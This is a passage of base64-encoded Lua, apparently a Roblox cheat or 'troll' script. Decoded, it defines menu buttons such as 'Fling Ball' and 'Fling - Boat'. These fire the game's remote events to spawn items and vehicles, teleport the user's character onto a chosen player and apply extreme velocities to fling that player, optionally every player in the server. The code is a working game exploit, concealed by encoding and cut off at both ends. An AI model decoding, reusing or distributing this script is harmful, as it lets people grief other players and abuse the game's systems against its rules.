wb3NfeSA9IHRyb290LlBvc2l0aW9uLlkgKyAodHJvb3QuVmVsb2NpdHkuWSAgMS41KQogICAgICAgICAgICAgICAgbG9jYWwgcG9zX3ogPSB0cm9vdC5Qb3NpdGlvbi5aICsgKHRyb290LlZlbG9jaXR5LlogIDEuNSkKCiAgICAgICAgICAgICAgICAtLSBQb3NpdGlvbiB0aGUgYmFsbCBkaXJlY3RseSBhdCB0aGUgYWRqdXN0ZWQgcG9zaXRpb24KICAgICAgICAgICAgICAgIGxvY2FsIHBvc2l0aW9uID0gVmVjdG9yMy5uZXcocG9zX3gsIHBvc195LCBwb3NfeikKICAgICAgICAgICAgICAgIEJhbGwuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhwb3NpdGlvbikKICAgICAgICAgICAgICAgIEJhbGwuT3JpZW50YXRpb24gKz0gVmVjdG9yMy5uZXcoNDUsIDYwLCAzMCkKZWxzZQpmb3IgaSwgdiBpbiBwYWlycyh0Y2hhckdldENoaWxkcmVuKCkpIGRvCmlmIHZJc0EoQmFzZVBhcnQpIGFuZCB2LkNhbkNvbGxpZGUgYW5kIG5vdCB2LkFuY2hvcmVkIHRoZW4KQmFsbC5DRnJhbWUgPSB2LkNGcmFtZQp0YXNrLndhaXQoMTYwMDApCmVuZAplbmQKZW5kCiAgICAgICAgICAgICAgICB0YXNrLndhaXQoMTYwMDApCiAgICAgICAgICAgIHVudGlsIHRyb290LlZlbG9jaXR5Lk1hZ25pdHVkZSAgMTAwMCBvciB0aHVtLkhlYWx0aCA9IDAgb3Igbm90IHRjaGFySXNEZXNjZW5kYW50T2Yod29ya3NwYWNlKSBvciB0YXJnZXQuUGFyZW50IH49IHBsYXllcnMKICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IGh1bWFub2lkCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpUcm9sbEFkZEJ1dHRvbih7CiAgICBOYW1lID0gRmxpbmcgQmFsbCwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIEZsaW5nQmFsbChnYW1lR2V0U2VydmljZShQbGF5ZXJzKVtzZWxlY3RlZFBsYXllck5hbWVdKQogICAgZW5kCn0pCgpsb2NhbCBQbGF5ZXJzID0gZ2FtZUdldFNlcnZpY2UoJ1BsYXllcnMnKQpsb2NhbCBscGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKbG9jYWwgZnVuY3Rpb24gaXNJdGVtSW5JbnZlbnRvcnkoaXRlbU5hbWUpCiAgICBmb3IgXywgaXRlbSBpbiBwYWlycyhscGxheWVyLkJhY2twYWNrR2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBpdGVtLk5hbWUgPT0gaXRlbU5hbWUgdGhlbgogICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gZmFsc2UKZW5kCgpsb2NhbCBmdW5jdGlvbiBlcXVpcEl0ZW0oaXRlbU5hbWUpCiAgICBsb2NhbCBpdGVtID0gbHBsYXllci5CYWNrcGFja0ZpbmRGaXJzdENoaWxkKGl0ZW1OYW1lKQogICAgaWYgaXRlbSB0aGVuCiAgICAgICAgbHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRFcXVpcFRvb2woaXRlbSkKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIHVuZXF1aXBJdGVtKGl0ZW1OYW1lKQogICAgbG9jYWwgaXRlbSA9IGxwbGF5ZXIuQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGQoaXRlbU5hbWUpCiAgICBpZiBpdGVtIHRoZW4KICAgICAgICBpdGVtLlBhcmVudCA9IGxwbGF5ZXIuQmFja3BhY2sKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIEFjdGl2ZUF1dG9GbGluZyh0YXJnZXRQbGF5ZXIpCiAgICBpZiBub3QgaXNJdGVtSW5JbnZlbnRvcnkoQ291Y2gpIHRoZW4KICAgICAgICBsb2NhbCBhcmdzID0geyBbMV0gPSBQaWNraW5nVG9vbHMsIFsyXSA9IENvdWNoIH0KICAgICAgICBnYW1lR2V0U2VydmljZShSZXBsaWNhdGVkU3RvcmFnZSkuUkVGaW5kRmlyc3RDaGlsZCgxVG9vMWwpSW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgIGVuZAoKICAgIGVxdWlwSXRlbShDb3VjaCkKICAgIGdldGdlbnYoKS5mbGluZ2xvb3AgPSB0cnVlCgogICAgd2hpbGUgZ2V0Z2VudigpLmZsaW5nbG9vcCBkbwogICAgICAgIGxvY2FsIGZ1bmN0aW9uIGZsaW5nbG9vcGZpeCgpCiAgICAgICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lR2V0U2VydmljZShQbGF5ZXJzKQogICAgICAgICAgICBsb2NhbCBQbGF5ZXIgPSBQbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgICAgIGxvY2FsIEFsbEJvb2wgPSBmYWxzZQoKICAgICAgICAgICAgbG9jYWwgU2tpZEZsaW5nID0gZnVuY3Rpb24oVGFyZ2V0UGxheWVyKQogICAgICAgICAgICAgICAgbG9jYWwgQ2hhcmFjdGVyID0gUGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgbG9jYWwgSHVtYW5vaWQgPSBDaGFyYWN0ZXIgYW5kIENoYXJhY3RlckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhIdW1hbm9pZCkKICAgICAgICAgICAgICAgIGxvY2FsIFJvb3RQYXJ0ID0gSHVtYW5vaWQgYW5kIEh1bWFub2lkLlJvb3RQYXJ0CiAgICAgICAgICAgICAgICBsb2NhbCBUQ2hhcmFjdGVyID0gVGFyZ2V0UGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICAgICAgbG9jYWwgVEh1bWFub2lkLCBUUm9vdFBhcnQsIFRIZWFkLCBBY2Nlc3NvcnksIEhhbmRsZQoKICAgICAgICAgICAgICAgIGlmIFRDaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpIHRoZW4KICAgICAgICAgICAgICAgICAgICBUSHVtYW5vaWQgPSBUQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEh1bWFub2lkKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBpZiBUSHVtYW5vaWQgYW5kIFRIdW1hbm9pZC5Sb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgVFJvb3RQYXJ0ID0gVEh1bWFub2lkLlJvb3RQYXJ0CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGlmIFRDaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZChIZWFkKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgVEhlYWQgPSBUQ2hhcmFjdGVyLkhlYWQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgVENoYXJhY3RlckZpbmRGaXJzdENoaWxkT2ZDbGFzcyhBY2Nlc3NvcnkpIHRoZW4KICAgICAgICAgICAgICAgICAgICBBY2Nlc3NvcnkgPSBUQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRPZkNsYXNzKEFjY2Vzc29yeSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgQWNjZXNzb3J5IGFuZCBBY2Nlc3NvcnlGaW5kRmlyc3RDaGlsZChIYW5kbGUpIHRoZW4KICAgICAgICAgICAgICAgICAgICBIYW5kbGUgPSBBY2Nlc3NvcnkuSGFuZGxlCiAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICBpZiBDaGFyYWN0ZXIgYW5kIEh1bWFub2lkIGFuZCBSb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaWYgUm9vdFBhcnQuVmVsb2NpdHkuTWFnbml0dWRlICA1MCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGdldGdlbnYoKS5PbGRQb3MgPSBSb290UGFydC5DRnJhbWUKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBUSHVtYW5vaWQgYW5kIFRIdW1hbm9pZC5TaXQgYW5kIG5vdCBBbGxCb29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdW5lcXVpcEl0ZW0oQ291Y2gpCiAgICAgICAgICAgICAgICAgICAgICAgIGdldGdlbnYoKS5mbGluZ2xvb3AgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBpZiBUSGVhZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSBUSGVhZAogICAgICAgICAgICAgICAgICAgIGVsc2VpZiBub3QgVEhlYWQgYW5kIEhhbmRsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNhbWVyYVN1YmplY3QgPSBIYW5kbGUKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgVEh1bWFub2lkIGFuZCBUUm9vdFBhcnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB3b3Jrc3BhY2UuQ3VycmVudENhbWVyYS5DYW1lcmFTdWJqZWN0ID0gVEh1bWFub2lkCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBUQ2hhcmFjdGVyRmluZEZpcnN0Q2hpbGRXaGljaElzQShCYXNlUGFydCkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgICAgICBlbmQKCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgRlBvcyA9IGZ1bmN0aW9uKEJhc2VQYXJ0LCBQb3MsIEFuZykKICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhCYXNlUGFydC5Qb3NpdGlvbikgIFBvcyAgQW5nCiAgICAgICAgICAgICAgICAgICAgICAgIENoYXJhY3RlclNldFByaW1hcnlQYXJ0Q0ZyYW1lKENGcmFtZS5uZXcoQmFzZVBhcnQuUG9zaXRpb24pICBQb3MgIEFuZykKICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTcsIDllNyAgMTAsIDllNykKICAgICAgICAgICAgICAgICAgICAgICAgUm9vdFBhcnQuUm90VmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICBsb2NhbCBTRkJhc2VQYXJ0ID0gZnVuY3Rpb24oQmFzZVBhcnQpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFRpbWVUb1dhaXQgPSAyCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIFRpbWUgPSB0aWNrKCkKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgQW5nbGUgPSAwCiAgICAgICAgICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgUm9vdFBhcnQgYW5kIFRIdW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgQmFzZVBhcnQuVmVsb2NpdHkuTWFnbml0dWRlICA1MCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEFuZ2xlID0gQW5nbGUgKyAxMDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAxLjUsIDApICsgVEh1bWFub2lkLk1vdmVEaXJlY3Rpb24gIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAgMS4yNSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIC0xLjUsIDApICsgVEh1bWFub2lkLk1vdmVEaXJlY3Rpb24gIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAgMS4yNSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDIuMjUsIDEuNSwgLTIuMjUpICsgVEh1bWFub2lkLk1vdmVEaXJlY3Rpb24gIEJhc2VQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAgMS4yNSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZChBbmdsZSksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KC0yLjI1LCAtMS41LCAyLjI1KSArIFRIdW1hbm9pZC5Nb3ZlRGlyZWN0aW9uICBCYXNlUGFydC5WZWxvY2l0eS5NYWduaXR1ZGUgIDEuMjUsIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGUpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAxLjUsIDApICsgVEh1bWFub2lkLk1vdmVEaXJlY3Rpb24sIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoQW5nbGUpLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAwKSArIFRIdW1hbm9pZC5Nb3ZlRGlyZWN0aW9uLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKEFuZ2xlKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIDEuNSwgVEh1bWFub2lkLldhbGtTcGVlZCksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoOTApLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAtVEh1bWFub2lkLldhbGtTcGVlZCksIENGcmFtZS5BbmdsZXMoMCwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgMS41LCBUSHVtYW5vaWQuV2Fsa1NwZWVkKSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg5MCksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIDEuNSwgVFJvb3RQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAgMS4yNSksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoOTApLCAwLCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRlBvcyhCYXNlUGFydCwgQ0ZyYW1lLm5ldygwLCAtMS41LCAtVFJvb3RQYXJ0LlZlbG9jaXR5Lk1hZ25pdHVkZSAgMS4yNSksIENGcmFtZS5BbmdsZXMoMCwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgMS41LCBUUm9vdFBhcnQuVmVsb2NpdHkuTWFnbml0dWRlICAxLjI1KSwgQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCg5MCksIDAsIDApKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGUG9zKEJhc2VQYXJ0LCBDRnJhbWUubmV3KDAsIC0xLjUsIDApLCBDRnJhbWUuQW5nbGVzKG1hdGgucmFkKDkwKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgLTEuNSwgMCksIENGcmFtZS5BbmdsZXMoMCwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgLTEuNSwgMCksIENGcmFtZS5BbmdsZXMobWF0aC5yYWQoLTkwKSwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEZQb3MoQmFzZVBhcnQsIENGcmFtZS5uZXcoMCwgLTEuNSwgMCksIENGcmFtZS5BbmdsZXMoMCwgMCwgMCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCBCYXNlUGFydC5WZWxvY2l0eS5NYWduaXR1ZGUgIDUwMCBvciBCYXNlUGFydC5QYXJlbnQgfj0gVGFyZ2V0UGxheWVyLkNoYXJhY3RlciBvciBUYXJnZXRQbGF5ZXIuUGFyZW50IH49IFBsYXllcnMgb3Igbm90IFRhcmdldFBsYXllci5DaGFyYWN0ZXIgPT0gVENoYXJhY3RlciBvciBUSHVtYW5vaWQuU2l0IG9yIEh1bWFub2lkLkhlYWx0aCA9IDAgb3IgdGljaygpICBUaW1lICsgVGltZVRvV2FpdCBvciBnZXRnZW52KCkuZmxpbmdsb29wID09IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kCgogICAgICAgICAgICAgICAgICAgIHdvcmtzcGFjZS5GYWxsZW5QYXJ0c0Rlc3Ryb3lIZWlnaHQgPSAwMAogICAgICAgICAgICAgICAgICAgIGxvY2FsIEJWID0gSW5zdGFuY2UubmV3KEJvZHlWZWxvY2l0eSkKICAgICAgICAgICAgICAgICAgICBCVi5OYW1lID0gU3BlZWREb1BhaQogICAgICAgICAgICAgICAgICAgIEJWLlBhcmVudCA9IFJvb3RQYXJ0CiAgICAgICAgICAgICAgICAgICAgQlYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyg5ZTgsIDllOCwgOWU4KQogICAgICAgICAgICAgICAgICAgIEJWLk1heEZvcmNlID0gVmVjdG9yMy5uZXcoMTAsIDEwLCAxMCkKICAgICAgICAgICAgICAgICAgICBIdW1hbm9pZFNldFN0YXRlRW5hYmxlZChFbnVtLkh1bWFub2lkU3RhdGVUeXBlLlNlYXRlZCwgZmFsc2UpCgogICAgICAgICAgICAgICAgICAgIGlmIFRSb290UGFydCBhbmQgVEhlYWQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVFJvb3RQYXJ0LkNGcmFtZS5wIC0gVEhlYWQuQ0ZyYW1lLnApLk1hZ25pdHVkZSAgNSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRkJhc2VQYXJ0KFRIZWFkKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBTRkJhc2VQYXJ0KFRSb290UGFydCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIFRSb290UGFydCBhbmQgbm90IFRIZWFkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgU0ZCYXNlUGFydChUUm9vdFBhcnQpCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIG5vdCBUUm9vdFBhcnQgYW5kIFRIZWFkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgU0ZCYXNlUGFydChUSGVhZCkKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgbm90IFRSb290UGFydCBhbmQgbm90IFRIZWFkIGFuZCBBY2Nlc3NvcnkgYW5kIEhhbmRsZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIFNGQmFzZVBhcnQoSGFuZGxlKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIEJWRGVzdHJveSgpCiAgICAgICAgICAgICAgICAgICAgSHVtYW5vaWRTZXRTdGF0ZUVuYWJsZWQoRW51bS5IdW1hbm9pZFN0YXRlVHlwZS5TZWF0ZWQsIHRydWUpCiAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkN1cnJlbnRDYW1lcmEuQ2FtZXJhU3ViamVjdCA9IEh1bWFub2lkCgogICAgICAgICAgICAgICAgICAgIHJlcGVhdAogICAgICAgICAgICAgICAgICAgICAgICBSb290UGFydC5DRnJhbWUgPSBnZXRnZW52KCkuT2xkUG9zICBDRnJhbWUubmV3KDAsIC41LCAwKQogICAgICAgICAgICAgICAgICAgICAgICBDaGFyYWN0ZXJTZXRQcmltYXJ5UGFydENGcmFtZShnZXRnZW52KCkuT2xkUG9zICBDRnJhbWUubmV3KDAsIC41LCAwKSkKICAgICAgICAgICAgICAgICAgICAgICAgSHVtYW5vaWRDaGFuZ2VTdGF0ZShHZXR0aW5nVXApCiAgICAgICAgICAgICAgICAgICAgICAgIHRhYmxlLmZvcmVhY2goQ2hhcmFjdGVyR2V0Q2hpbGRyZW4oKSwgZnVuY3Rpb24oXywgeCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHhJc0EoQmFzZVBhcnQpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB4LlZlbG9jaXR5LCB4LlJvdFZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoKSwgVmVjdG9yMy5uZXcoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgICAgICAgICB1bnRpbCAoUm9vdFBhcnQuUG9zaXRpb24gLSBnZXRnZW52KCkuT2xkUG9zLnApLk1hZ25pdHVkZSAgMjUKCiAgICAgICAgICAgICAgICAgICAgd29ya3NwYWNlLkZhbGxlblBhcnRzRGVzdHJveUhlaWdodCA9IGdldGdlbnYoKS5GUERICiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBpZiBBbGxCb29sIHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCB4IGluIG5leHQsIFBsYXllcnNHZXRQbGF5ZXJzKCkgZG8KICAgICAgICAgICAgICAgICAgICBTa2lkRmxpbmcoeCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGlmIHRhcmdldFBsYXllciB0aGVuCiAgICAgICAgICAgICAgICBTa2lkRmxpbmcodGFyZ2V0UGxheWVyKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIHRhc2sud2FpdCgpCiAgICAgICAgZW5kCgogICAgICAgIHdhaXQoKQogICAgICAgIHBjYWxsKGZsaW5nbG9vcGZpeCkKICAgIGVuZAplbmQKCmxvY2FsIGtpbGwgPSBUcm9sbEFkZFNlY3Rpb24oe05hbWUgPSBGbGluZyBCb2F0fSkKClRyb2xsQWRkQnV0dG9uKHsKICAgIE5hbWUgPSBGbGluZyAtIEJvYXQsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3Qgc2VsZWN0ZWRQbGF5ZXJOYW1lIG9yIG5vdCBnYW1lLlBsYXllcnNGaW5kRmlyc3RDaGlsZChzZWxlY3RlZFBsYXllck5hbWUpIHRoZW4KICAgICAgICAgICAgd2FybihObyBwbGF5ZXIgc2VsZWN0ZWQgb3IgcGxheWVyIGRvZXMgbm90IGV4aXN0KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgUGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgQ2hhcmFjdGVyID0gUGxheWVyLkNoYXJhY3RlcgogICAgICAgIGxvY2FsIEh1bWFub2lkID0gQ2hhcmFjdGVyIGFuZCBDaGFyYWN0ZXJGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoSHVtYW5vaWQpCiAgICAgICAgbG9jYWwgUm9vdFBhcnQgPSBDaGFyYWN0ZXIgYW5kIENoYXJhY3RlckZpbmRGaXJzdENoaWxkKEh1bWFub2lkUm9vdFBhcnQpCiAgICAgICAgbG9jYWwgVmVoaWNsZXMgPSBnYW1lLldvcmtzcGFjZUZpbmRGaXJzdENoaWxkKFZlaGljbGVzKQoKICAgICAgICBpZiBub3QgSHVtYW5vaWQgb3Igbm90IFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgd2FybihJbnZhbGlkIEh1bWFub2lkIG9yIFJvb3RQYXJ0KQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gc3Bhd25Cb2F0KCkKICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gQ0ZyYW1lLm5ldygxNzU0LCAtMiwgNTgpCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgIGdhbWVHZXRTZXJ2aWNlKFJlcGxpY2F0ZWRTdG9yYWdlKS5SRUZpbmRGaXJzdENoaWxkKDFDYTFyKUZpcmVTZXJ2ZXIoUGlja2luZ0JvYXQsIE1pbGl0YXJ5Qm9hdEZyZWUpCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgICAgICByZXR1cm4gVmVoaWNsZXNGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uQ2FyKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBQQ2FyID0gVmVoaWNsZXNGaW5kRmlyc3RDaGlsZChQbGF5ZXIuTmFtZS4uQ2FyKSBvciBzcGF3bkJvYXQoKQogICAgICAgIGlmIG5vdCBQQ2FyIHRoZW4KICAgICAgICAgICAgd2FybihGYWlsZWQgdG8gc3Bhd24gYm9hdCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIGxvY2FsIFNlYXQgPSBQQ2FyRmluZEZpcnN0Q2hpbGQoQm9keSkgYW5kIFBDYXIuQm9keUZpbmRGaXJzdENoaWxkKFZlaGljbGVTZWF0KQogICAgICAgIGlmIG5vdCBTZWF0IHRoZW4KICAgICAgICAgICAgd2FybihTZWF0IG5vdCBmb3VuZCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCgogICAgICAgIHJlcGVhdCAKICAgICAgICAgICAgdGFzay53YWl0KDAuMSkKICAgICAgICAgICAgUm9vdFBhcnQuQ0ZyYW1lID0gU2VhdC5DRnJhbWUgIENGcmFtZS5uZXcoMCwgMSwgMCkKICAgICAgICB1bnRpbCBIdW1hbm9pZC5TZWF0UGFydCA9PSBTZWF0CgogICAgICAgIHByaW50KEJvYXQgc3Bhd25lZCEpCgogICAgICAgIGxvY2FsIFRhcmdldFBsYXllciA9IGdhbWUuUGxheWVyc0ZpbmRGaXJzdENoaWxkKHNlbGVjdGVkUGxheWVyTmFtZSkKICAgICAgICBpZiBub3QgVGFyZ2V0UGxheWVyIG9yIG5vdCBUYXJnZXRQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgd2FybihQbGF5ZXIgbm90IGZvdW5kKQogICAgICAgICAgICByZXR1cm4KICAgICAgICBlbmQKCiAgICAgICAg